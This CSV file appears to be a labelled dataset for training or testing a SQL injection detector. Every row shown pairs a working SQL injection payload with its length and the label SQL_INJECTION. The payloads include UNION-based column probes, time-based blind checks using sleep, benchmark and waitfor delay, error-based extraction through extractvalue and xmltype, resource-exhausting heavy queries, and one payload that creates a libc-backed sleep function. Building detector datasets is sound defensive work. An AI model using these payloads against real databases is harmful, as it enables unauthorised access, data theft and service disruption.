payload,length,label
"1"") as uuth where 8555=8555 union all select null,null#",55,SQL_INJECTION
"1%"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""%""=""",61,SQL_INJECTION
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",99,SQL_INJECTION
"1"")) as jrld where 3488=3488;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",96,SQL_INJECTION
"-2838"" where 5442=5442 union all select 5442#",45,SQL_INJECTION
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),234,SQL_INJECTION
"1"" or elt(5873=5873,sleep(5))#",30,SQL_INJECTION
"1"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""cyyh""=""cyyh",224,SQL_INJECTION
1)) as xbii where 2262=2262 or sleep(5)--,41,SQL_INJECTION
"1%""))) union all select null,null,null,null,null--",50,SQL_INJECTION
"1%""));begin dbms_lock.sleep(5); end and ((""%""=""",47,SQL_INJECTION
"1);select like('abcdefg',upper(hex(randomblob(500000000/2))))",61,SQL_INJECTION
"1"" where 8241=8241 union all select null,null,null#",51,SQL_INJECTION
-5211 union all select 1754--,29,SQL_INJECTION
"1';iif(8214=4954,1,1/0)",23,SQL_INJECTION
"1' where 7910=7910;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",109,SQL_INJECTION
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",84,SQL_INJECTION
1')) as fqia where 1936=1936 and (select * from (select(sleep(5)))fzno)--,73,SQL_INJECTION
1%') rlike (select * from (select(sleep(5)))sgvo) and ('%'=',60,SQL_INJECTION
"1' in boolean mode) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)#",191,SQL_INJECTION
1';begin dbms_lock.sleep(5); end and 'wdce'='wdce,49,SQL_INJECTION
"1"" where 2878=2878 union all select null,null,null,null,null#",61,SQL_INJECTION
1'||(select 'ilkr' from dual where 9296=9296;select case when 7717=7717 then 1 else null end--,94,SQL_INJECTION
1' where 4253=4253;waitfor delay '0:0:5'--,42,SQL_INJECTION
"1',(select (case when (9644=9644) then dbms_pipe.receive_message(chr(75)||chr(78)||chr(104)||chr(98),5) else 1/(select 0 from dual) end) from dual)",147,SQL_INJECTION
"1"" or 8466=benchmark(5000000,md5(0x694a4745))",45,SQL_INJECTION
1' where 1652=1652 and sleep(5)#,32,SQL_INJECTION
"1"" where 4073=4073 rlike (select (case when (8716=4281) then 1 else 0x28 end))--",80,SQL_INJECTION
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('jhxh'='jhxh",126,SQL_INJECTION
"1%' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and '%'='",119,SQL_INJECTION
"1"") where 2570=2570 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",122,SQL_INJECTION
1'||(select 'vdeo' where 4355=4355;(select * from (select(sleep(5)))acdk)#,74,SQL_INJECTION
-6865) or (8459=8459)*4906 and (6107=6107,41,SQL_INJECTION
1%') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',247,SQL_INJECTION
"1%"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,SQL_INJECTION
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",102,SQL_INJECTION
"1%"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""%""=""",143,SQL_INJECTION
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'mlmu'='mlmu",134,SQL_INJECTION
1%')) and 2006=2006,19,SQL_INJECTION
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""pxbk"" like ""pxbk",109,SQL_INJECTION
"-3518) union all select 1877,1877,1877,1877#",44,SQL_INJECTION
"1)) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((3626=3626",109,SQL_INJECTION
"1""))) and 4124=7245 and (((""tuom""=""tuom",39,SQL_INJECTION
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('lgcw'='lgcw",125,SQL_INJECTION
1)) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((7594=7594,200,SQL_INJECTION
"1"") or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",65,SQL_INJECTION
"1"") as kfvy where 7305=7305 or sleep(5)--",41,SQL_INJECTION
"1"")) rlike sleep(5)#",20,SQL_INJECTION
1) where 6725=6725 and 1553=7419,32,SQL_INJECTION
"1 where 4940=4940;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",85,SQL_INJECTION
"1) union all select null,null,null,null,null,null,null,null,null,null#",70,SQL_INJECTION
1'+(select 'tbfj' where 4016=4016;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,98,SQL_INJECTION
"1')) as lxjs where 6503=6503 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",160,SQL_INJECTION
"1"") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""imlx""=""imlx",192,SQL_INJECTION
-2625')) or 3038=3038,21,SQL_INJECTION
"1'+(select kgon where 9014=9014 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))+'",221,SQL_INJECTION
"-9054"") as rgyu where 3792=3792 order by 1--",44,SQL_INJECTION
"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",58,SQL_INJECTION
"1%"");select benchmark(5000000,md5(0x4c4d6142)) and (""%""=""",57,SQL_INJECTION
"-3731'))) or elt(7540=1412,1412) and ((('iwch'='iwch",52,SQL_INJECTION
"1'||(select 'rqzu' from dual where 9516=9516 or elt(5873=5873,sleep(5))#",72,SQL_INJECTION
"1%'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",113,SQL_INJECTION
"1"" and elt(3114=3114,sleep(5))#",31,SQL_INJECTION
"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""qyew""=""qyew",120,SQL_INJECTION
1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- knpw,189,SQL_INJECTION
"1%"";select (case when (7019=1998) then 7019 else 7019*(select 7019 from mysql.db) end)#",87,SQL_INJECTION
1')));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,114,SQL_INJECTION
"-2263') where 7931=7931 union all select 7931,7931,7931--",57,SQL_INJECTION
-2784) where 5261=5261 or 3472=1728#,36,SQL_INJECTION
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('czqk' like 'czqk,88,SQL_INJECTION
"1',(case when 3598=2118 then 1 else null end)",45,SQL_INJECTION
"1') where 1600=1600 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",161,SQL_INJECTION
"1"")) as ccjk where 1932=1932 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,SQL_INJECTION
1')) and (select * from (select(sleep(5)))fzno) and (('vpqr'='vpqr,66,SQL_INJECTION
"1') where 9454=9454 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",127,SQL_INJECTION
"1'||(select 'bnaz' from dual where 7168=7168 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",197,SQL_INJECTION
"1')) as ewyk where 4828=4828 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",186,SQL_INJECTION
"-3596') union all select 5349,5349,5349,5349,5349,5349#",55,SQL_INJECTION
"(select concat(0x7171706a71,(select (elt(7381=7381,1))),0x717a767a71))",70,SQL_INJECTION
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'bkcs'='bkcs",79,SQL_INJECTION
"1%""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",108,SQL_INJECTION
"-1084 where 1181=1181 or make_set(9354=9354,7185)--",51,SQL_INJECTION
-5152')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('jumr' like 'jumr,234,SQL_INJECTION
"1' where 5251=5251 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",190,SQL_INJECTION
"1') where 1577=1577 union all select null,null,null,null,null,null#",67,SQL_INJECTION
"1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+'",76,SQL_INJECTION
"1%'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",80,SQL_INJECTION
-6233') where 9820=9820 or 3038=3038,36,SQL_INJECTION
-3107') where 7782=7782 or 8571=8571--,38,SQL_INJECTION
1') and 1987=3756#,18,SQL_INJECTION
1)) and sleep(5) and ((9084=9084,32,SQL_INJECTION
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""vzft""=""vzft",61,SQL_INJECTION
"-7749"" or (2689=7481)*7481",26,SQL_INJECTION
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)# yrpn",122,SQL_INJECTION
"1"") where 5065=5065;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",107,SQL_INJECTION
"1""));select count(*) from generate_series(1,5000000)--",54,SQL_INJECTION
"-4305) as ldrt where 2567=2567 union all select 2567,2567,2567,2567,2567,2567,2567#",83,SQL_INJECTION
"1)) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((8867=8867",158,SQL_INJECTION
1')) as jtmf where 3937=3937;select case when 7717=7717 then 1 else null end--,78,SQL_INJECTION
1'||(select 'goen' from dual where 8586=8586;select (case when (2132=8969) then 1 else 2132*(select 2132 from master..sysdatabases) end)--,138,SQL_INJECTION
-6129) as vuze where 1565=1565 or (8459=8459)*4906--,52,SQL_INJECTION
"1' where 1031=1031 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",124,SQL_INJECTION
"-3707""))) or 8571=8571--",24,SQL_INJECTION
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",105,SQL_INJECTION
1') as uwmy where 6980=6980;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,92,SQL_INJECTION
"1%"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",104,SQL_INJECTION
"1'||(select 'zifu' from dual where 4822=4822 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",142,SQL_INJECTION
1) as ozga where 4002=4002 and 6969=(select 6969 from pg_sleep(5))--,68,SQL_INJECTION
"1%""));select * from generate_series(2382,2382,case when (2382=4352) then 1 else 0 end) limit 1--",96,SQL_INJECTION
1);begin user_lock.sleep(5); end,32,SQL_INJECTION
"-7884"" where 3297=3297 or 2492=6158",35,SQL_INJECTION
1)) as lkqx where 6468=6468 or (select * from (select(sleep(5)))sddo)#,70,SQL_INJECTION
1');waitfor delay '0:0:5',25,SQL_INJECTION
1') or 4240=(select 4240 from pg_sleep(5))--,44,SQL_INJECTION
"1')) as efmy where 7299=7299 and 8635=(select count(*) from generate_series(1,5000000))--",89,SQL_INJECTION
"-9361"")) union all select 3112#",31,SQL_INJECTION
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'zlxw'='zlxw",109,SQL_INJECTION
"1'||(select 'baur' from dual where 9384=9384 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",153,SQL_INJECTION
1' where 4115=4115;select (case when (2501=4688) then 2501 else cast(1 as int)/(select 0 from dual) end) from dual--,116,SQL_INJECTION
"1"") where 1144=1144 and 2006=2006",33,SQL_INJECTION
1' and (5116=1602)*1602,23,SQL_INJECTION
"1%"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",168,SQL_INJECTION
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('drvk' like 'drvk",231,SQL_INJECTION
1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'=',64,SQL_INJECTION
1') where 7903=7903;select (case when (8841=9675) then 8841 else cast(1 as int)/(select 0 from dual) end) from dual--,117,SQL_INJECTION
1') as bihs where 4197=4197;select pg_sleep(5)--,48,SQL_INJECTION
"1%"");select count(*) from generate_series(1,5000000) and (""%""=""",63,SQL_INJECTION
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",107,SQL_INJECTION
"1"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""gvlc"" like ""gvlc",130,SQL_INJECTION
"1'||(select 'ukfj' where 7133=7133 union all select null,null,null#",67,SQL_INJECTION
"-9487)) as rvck where 9404=9404 or make_set(8921=6045,6045)--",61,SQL_INJECTION
"1%"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""",106,SQL_INJECTION
"1"") union all select null,null,null,null--",42,SQL_INJECTION
"1')) as qhpv where 7049=7049 and make_set(8403=8403,8899)--",59,SQL_INJECTION
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('zfrs'='zfrs",125,SQL_INJECTION
"-8073))) union all select 4481,4481,4481,4481--",47,SQL_INJECTION
"1'||(select 'kfyh' where 4737=4737 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'",239,SQL_INJECTION
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('zdkn'='zdkn",109,SQL_INJECTION
1%' and 4595=4595#,18,SQL_INJECTION
"1')) as wdor where 7426=7426;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",113,SQL_INJECTION
"1');iif(5257=5257,1,1/0)",24,SQL_INJECTION
"1' in boolean mode) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)#",111,SQL_INJECTION
"-1876'||(select 'itfc' from dual where 9584=9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",107,SQL_INJECTION
"1'||(select 'ymez' from dual where 9870=9870 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",146,SQL_INJECTION
"1') where 6274=6274 or 8156=(select count(*) from generate_series(1,5000000))--",79,SQL_INJECTION
"1"" where 3933=3933 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",109,SQL_INJECTION
"1%"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",97,SQL_INJECTION
"1') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",112,SQL_INJECTION
"1"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",112,SQL_INJECTION
-1190' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'yxry' like 'yxry,259,SQL_INJECTION
-6100') as kvfc where 2377=2377 or 6872=6872--,46,SQL_INJECTION
"1%""))) union all select null,null#",34,SQL_INJECTION
"1%""));select benchmark(5000000,md5(0x4c4d6142)) and ((""%""=""",59,SQL_INJECTION
"1%') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('%'='",118,SQL_INJECTION
1%')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('%'=',77,SQL_INJECTION
"1)) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((7200=7200",120,SQL_INJECTION
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))-- kegk",69,SQL_INJECTION
1') where 2227=2227;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,103,SQL_INJECTION
-5470')) or (8459=8459)*4906 and (('oeam'='oeam,47,SQL_INJECTION
"1%"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,SQL_INJECTION
"1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('cbwx'='cbwx",219,SQL_INJECTION
1 and (3020=3020)*6703-- zsnl,29,SQL_INJECTION
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,220,SQL_INJECTION
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# bzoq",100,SQL_INJECTION
"1"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",95,SQL_INJECTION
"1"") where 9461=9461 union all select null,null,null,null,null,null,null,null,null#",82,SQL_INJECTION
-9340) where 5462=5462 or 3038=3038,35,SQL_INJECTION
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",90,SQL_INJECTION
1'+(select wpkh where 5842=5842;select sleep(5))+',50,SQL_INJECTION
1%')) rlike sleep(5) and (('%'=',32,SQL_INJECTION
"1'||(select 'hvqw' from dual where 4423=4423 union all select null,null,null--",78,SQL_INJECTION
